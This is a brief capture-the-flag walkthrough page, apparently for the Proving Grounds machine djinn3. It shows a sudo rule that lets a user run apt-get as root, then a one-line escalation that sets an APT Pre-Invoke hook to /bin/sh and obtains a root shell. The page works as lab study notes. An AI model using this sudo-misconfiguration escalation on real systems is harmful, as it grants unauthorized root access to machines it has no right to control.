---
layout: default
title: Apt-get
parent: Sudo
nav_order: 6
---

# Apt-get

---

## Sudo Permissions

```bash
jason@djinn3:/home/saint$ sudo -l
[sudo] password for jason:
Matching Defaults entries for jason on djinn3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on djinn3:
    (root) PASSWD: /usr/bin/apt-get

```

Checking GFTOBins we have a way to exploit _apt-get_ with Sudo permissions

![gtfo](../../../../assets/images/ctfs/proving_grounds/djinn3/gtfo.png)

```bash
jason@djinn3:/home/saint$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

```
